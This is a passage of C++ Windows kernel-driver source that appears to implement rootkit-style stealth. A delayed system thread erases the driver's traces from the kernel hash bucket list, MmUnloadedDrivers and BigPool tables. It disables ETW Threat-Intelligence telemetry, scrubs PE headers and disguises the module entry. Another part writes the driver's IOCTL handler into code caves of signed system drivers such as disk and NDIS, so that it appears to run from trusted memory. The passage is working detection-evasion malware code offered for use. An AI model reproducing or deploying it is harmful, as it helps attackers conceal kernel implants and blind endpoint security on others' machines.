        if (_KeDelayExecutionThread) {
            NTSTATUS delay_status = _KeDelayExecutionThread(KernelMode, FALSE, &delay);
            WW_LOG("stealth_delayed_hide::initial_delay status=0x%08lx elapsed_us=%lu",
                delay_status,
                elapsed_us(thread_start, freq));
        } else {
            WW_LOG("stealth_delayed_hide::initial_delay skipped missing KeDelayExecutionThread");
        }

        BOOLEAN live_client = wait_for_registered_client("before_cleanup");
        PDRIVER_OBJECT drvObj = g_DelayedHideContext.DriverObject;

        if (live_client && drvObj && _MmIsAddressValid(drvObj) &&
            drvObj->DriverSection && _MmIsAddressValid(drvObj->DriverSection)) {
            LARGE_INTEGER step_start = KeQueryPerformanceCounter(nullptr);
            bool stealthReady = SetupStealthFunctions();
            WW_LOG("stealth_delayed_hide::step name=setup result=%u elapsed_us=%lu",
                stealthReady ? 1u : 0u,
                elapsed_us(step_start, freq));

            PVOID ntBase = (PVOID)get_nt_base();
            auto ldrEntry = static_cast<PLDR_DATA_TABLE_ENTRY>(drvObj->DriverSection);

            ULONG order = (ULONG)((__rdtsc() >> 4) % 6);

            WW_LOG("stealth_delayed_hide::cleanup_begin driver=%p section=%p nt_base=%p ldr=%p dll_base=%p size=0x%lx order=%lu",
                drvObj,
                drvObj->DriverSection,
                ntBase,
                ldrEntry,
                ldrEntry ? ldrEntry->DllBase : nullptr,
                ldrEntry ? ldrEntry->SizeOfImage : 0,
                order);

            volatile ULONG spin = 8 + (order & 0x7);
            while (spin--) YieldProcessor();

            if (ntBase && ldrEntry && ldrEntry->BaseDllName.Buffer) {
                step_start = KeQueryPerformanceCounter(nullptr);
                bool hash_clean = CleanKernelHashBucketList(ntBase, &ldrEntry->BaseDllName);
                WW_LOG("stealth_delayed_hide::step name=hash_bucket result=%u elapsed_us=%lu",
                    hash_clean ? 1u : 0u,
                    elapsed_us(step_start, freq));
            }

            spin = 4 + (order & 0x3);
            while (spin--) YieldProcessor();

            if (ntBase) {
                step_start = KeQueryPerformanceCounter(nullptr);
                bool unloaded = CleanMmUnloadedDrivers(ntBase);
                WW_LOG("stealth_delayed_hide::step name=mm_unloaded result=%u elapsed_us=%lu",
                    unloaded ? 1u : 0u,
                    elapsed_us(step_start, freq));
            }

            spin = 6 + (order & 0x5);
            while (spin--) YieldProcessor();

            if (ntBase && ldrEntry && ldrEntry->DllBase && ldrEntry->SizeOfImage) {
                step_start = KeQueryPerformanceCounter(nullptr);
                bool big_pool = CleanBigPoolTable(ntBase, ldrEntry->DllBase, ldrEntry->SizeOfImage);
                WW_LOG("stealth_delayed_hide::step name=big_pool result=%u elapsed_us=%lu",
                    big_pool ? 1u : 0u,
                    elapsed_us(step_start, freq));
            }

            if (ntBase) {
                step_start = KeQueryPerformanceCounter(nullptr);
                bool etw = DisableEtwThreatIntel(ntBase);
                WW_LOG("stealth_delayed_hide::step name=etw_threat_intel result=%u elapsed_us=%lu",
                    etw ? 1u : 0u,
                    elapsed_us(step_start, freq));
            }

            if (ldrEntry) {
                step_start = KeQueryPerformanceCounter(nullptr);
                bool scrub = ScrubPEMetadata(drvObj);
                WW_LOG("stealth_delayed_hide::step name=scrub_pe result=%u elapsed_us=%lu",
                    scrub ? 1u : 0u,
                    elapsed_us(step_start, freq));

                step_start = KeQueryPerformanceCounter(nullptr);
                bool disguise = DisguiseModuleEntry(drvObj);
                WW_LOG("stealth_delayed_hide::step name=disguise_module result=%u elapsed_us=%lu",
                    disguise ? 1u : 0u,
                    elapsed_us(step_start, freq));
            }
        } else if (live_client) {
            WW_LOG("stealth_delayed_hide::invalid_driver driver=%p valid=%u section=%p",
                drvObj,
                drvObj && _MmIsAddressValid(drvObj) ? 1u : 0u,
                drvObj ? drvObj->DriverSection : nullptr);
        }

        g_DelayedHideContext.DriverObject = nullptr;
        _InterlockedExchange(&g_DelayedHideContext.ReadyToHide, 0);
        _InterlockedExchange(&g_DelayedHideThreadActive, 0);

        if (_KeDelayExecutionThread) {
            LARGE_INTEGER shortDelay;
            shortDelay.QuadPart = -100000LL;
            _KeDelayExecutionThread(KernelMode, FALSE, &shortDelay);
        }

        WW_LOG("stealth_delayed_hide::exit elapsed_us=%lu ready=%ld active=%ld pid=%llu validation=%ld",
            elapsed_us(thread_start, freq),
            _InterlockedCompareExchange(&g_DelayedHideContext.ReadyToHide, 0, 0),
            _InterlockedCompareExchange(&g_DelayedHideThreadActive, 0, 0),
            handle_to_u64(registered_client_pid_snapshot()),
            _InterlockedCompareExchange(&caller_validation::g_validation_enabled, 0, 0));

        if (_PsTerminateSystemThread) {
            _PsTerminateSystemThread(STATUS_SUCCESS);
        }
    }

    inline bool ScheduleDelayedHide(PDRIVER_OBJECT DriverObject) {
        if (!DriverObject || !DriverObject->DriverSection)
            return false;

        if (!_PsCreateSystemThread || !_ZwClose)
            return false;

        if (_InterlockedCompareExchange(&g_DelayedHideContext.ReadyToHide, 1, 0) != 0)
            return false;

        g_DelayedHideContext.DriverObject = DriverObject;

        HANDLE threadHandle = nullptr;
        NTSTATUS status = _PsCreateSystemThread(
            &threadHandle,
            THREAD_ALL_ACCESS,
            nullptr,
            nullptr,
            nullptr,
            (PKSTART_ROUTINE)DelayedHideThreadRoutine,
            nullptr
        );

        if (!NT_SUCCESS(status)) {
            g_DelayedHideContext.DriverObject = nullptr;
            _InterlockedExchange(&g_DelayedHideContext.ReadyToHide, 0);
            return false;
        }

        if (threadHandle) {
            _ZwClose(threadHandle);
        }

        return true;
    }
}

namespace signed_memory {

    inline volatile PVOID g_RelocatedDispatchBase = nullptr;
    inline volatile SIZE_T g_RelocatedDispatchSize = 0;
    inline volatile PVOID g_DonorDriverBase = nullptr;
    inline volatile LONG g_SignedMemoryInitialized = 0;

    struct SIGNED_DONOR_INFO {
        PVOID ImageBase;
        ULONG ImageSize;
        PVOID TextBase;
        ULONG TextSize;
        PVOID CodeCaveBase;
        ULONG CodeCaveSize;
    };

    static const wchar_t* g_DonorCandidates[] = {
        L"\\Driver\\disk",
        L"\\Driver\\classpnp",
        L"\\Driver\\partmgr",
        L"\\Driver\\volmgr",
        L"\\Driver\\fltMgr",
        L"\\Driver\\ksecdd",
        L"\\Driver\\cng",
        L"\\Driver\\pcw",
        L"\\Driver\\NDIS"
    };

    __forceinline PVOID FindSignedDriverByRef(const wchar_t* driverName) {
        if (!_ObReferenceObjectByName || !_ObfDereferenceObject)
            return nullptr;

        UNICODE_STRING uniName;
        _RtlInitUnicodeString(&uniName, driverName);

        PDRIVER_OBJECT driverObj = nullptr;
        NTSTATUS status = _ObReferenceObjectByName(
            &uniName,
            OBJ_CASE_INSENSITIVE,
            nullptr,
            0,
            *::IoDriverObjectType,
            KernelMode,
            nullptr,
            (PVOID*)&driverObj
        );

        if (!NT_SUCCESS(status) || !driverObj) {
            return nullptr;
        }

        PVOID driverBase = nullptr;
        __try {
            if (driverObj->DriverSection && _MmIsAddressValid(driverObj->DriverSection)) {
                PLDR_DATA_TABLE_ENTRY ldrEntry = (PLDR_DATA_TABLE_ENTRY)driverObj->DriverSection;
                if (_MmIsAddressValid(ldrEntry->DllBase)) {
                    driverBase = ldrEntry->DllBase;
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            driverBase = nullptr;
        }

        _ObfDereferenceObject(driverObj);
        return driverBase;
    }

    __forceinline bool GetDriverTextSection(PVOID driverBase, PVOID* outTextBase, ULONG* outTextSize) {
        if (!driverBase || !_MmIsAddressValid(driverBase))
            return false;

        __try {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)driverBase;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE)
                return false;

            PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((UCHAR*)driverBase + dos->e_lfanew);
            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
                return false;

            PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
            for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                if ((sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                    (sections[i].Characteristics & IMAGE_SCN_CNT_CODE)) {
                    *outTextBase = (PVOID)((UCHAR*)driverBase + sections[i].VirtualAddress);
                    *outTextSize = sections[i].Misc.VirtualSize;
                    return true;
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    __forceinline PVOID FindCodeCaveInSection(PVOID textBase, ULONG textSize, SIZE_T requiredSize) {
        if (!textBase || !_MmIsAddressValid(textBase) || textSize < 0x1000 || requiredSize == 0)
            return nullptr;

        SIZE_T alignedSize = (requiredSize + 0x10) & ~0xF;
        SIZE_T searchStart = textSize - alignedSize - 0x100;

        if (searchStart > textSize || searchStart < 0x1000)
            return nullptr;

        __try {
            UCHAR* base = (UCHAR*)textBase;

            for (SIZE_T offset = searchStart; offset > 0x1000; offset -= 0x10) {
                if (!_MmIsAddressValid(&base[offset]))
                    continue;

                bool isCave = true;
                SIZE_T validCount = 0;

                for (SIZE_T j = 0; j < alignedSize && isCave; j++) {
                    if (!_MmIsAddressValid(&base[offset + j])) {
                        isCave = false;
                        break;
                    }
                    UCHAR byte = base[offset + j];
                    if (byte != 0xCC && byte != 0x00 && byte != 0x90) {
                        isCave = false;
                    } else {
                        validCount++;
                    }
                }

                if (isCave && validCount >= alignedSize) {
                    return &base[offset];
                }
            }

            SIZE_T slackOffset = textSize - 0x180;
            if (slackOffset > 0x1000 && _MmIsAddressValid(&base[slackOffset])) {
                bool slackValid = true;
                for (SIZE_T j = 0; j < alignedSize && slackValid; j++) {
                    if (!_MmIsAddressValid(&base[slackOffset + j])) {
                        slackValid = false;
                    } else {
                        UCHAR byte = base[slackOffset + j];
                        if (byte != 0x00 && byte != 0xCC && byte != 0x90) {
                            slackValid = false;
                        }
                    }
                }
                if (slackValid) {
                    return &base[slackOffset];
                }
            }

        } __except(EXCEPTION_EXECUTE_HANDLER) {
            return nullptr;
        }

        return nullptr;
    }

    __forceinline bool FindSuitableDonor(SIGNED_DONOR_INFO* outInfo) {
        if (!outInfo)
            return false;

        for (int i = 0; i < sizeof(g_DonorCandidates) / sizeof(g_DonorCandidates[0]); i++) {
            PVOID driverBase = FindSignedDriverByRef(g_DonorCandidates[i]);
            if (!driverBase)
                continue;

            PVOID textBase = nullptr;
            ULONG textSize = 0;

            if (!GetDriverTextSection(driverBase, &textBase, &textSize))
                continue;

            if (textSize < 0x2000)
                continue;

            outInfo->ImageBase = driverBase;
            outInfo->TextBase = textBase;
            outInfo->TextSize = textSize;
            outInfo->CodeCaveBase = nullptr;
            outInfo->CodeCaveSize = 0;

            return true;
        }

        return false;
    }

    __forceinline bool RelocateDispatchToSignedMemory(PDRIVER_OBJECT driverObj, SIZE_T codeSize) {
        if (!driverObj || codeSize == 0)
            return false;

        if (_InterlockedCompareExchange(&g_SignedMemoryInitialized, 1, 0) != 0)
            return true;

        SIGNED_DONOR_INFO donorInfo = {};
        if (!FindSuitableDonor(&donorInfo)) {
            _InterlockedExchange(&g_SignedMemoryInitialized, 0);
            return false;
        }

        PVOID codeCave = FindCodeCaveInSection(donorInfo.TextBase, donorInfo.TextSize, codeSize);
        if (!codeCave) {
            _InterlockedExchange(&g_SignedMemoryInitialized, 0);
            return false;
        }

        donorInfo.CodeCaveBase = codeCave;
        donorInfo.CodeCaveSize = (ULONG)codeSize;

        PDRIVER_DISPATCH originalHandler = driverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL];
        if (!originalHandler || !_MmIsAddressValid((PVOID)originalHandler)) {
            _InterlockedExchange(&g_SignedMemoryInitialized, 0);
            return false;
        }

        SIZE_T handlerSize = min(codeSize, (SIZE_T)0x400);

        if (!stealth::SafeWriteMemory(codeCave, (PVOID)originalHandler, handlerSize)) {
            _InterlockedExchange(&g_SignedMemoryInitialized, 0);
            return false;
        }

        g_RelocatedDispatchBase = codeCave;
        g_RelocatedDispatchSize = handlerSize;
        g_DonorDriverBase = donorInfo.ImageBase;

        KeMemoryBarrier();
        _InterlockedExchange(&g_SignedMemoryInitialized, 2);

        return true;
    }

    __forceinline PVOID GetRelocatedDispatch() {
        if (_InterlockedCompareExchange(&g_SignedMemoryInitialized, 2, 2) == 2) {
            return (PVOID)g_RelocatedDispatchBase;
        }
        return nullptr;
    }

    __forceinline bool IsCodeInSignedRegion(PVOID address) {
        if (!address)
            return false;

        PVOID relocBase = (PVOID)g_RelocatedDispatchBase;
        SIZE_T relocSize = g_RelocatedDispatchSize;

        if (relocBase && relocSize > 0) {
            ULONG_PTR base = (ULONG_PTR)relocBase;
            ULONG_PTR end = base + relocSize;
            ULONG_PTR addr = (ULONG_PTR)address;

            if (addr >= base && addr < end)
                return true;
        }

        return false;
    }
}
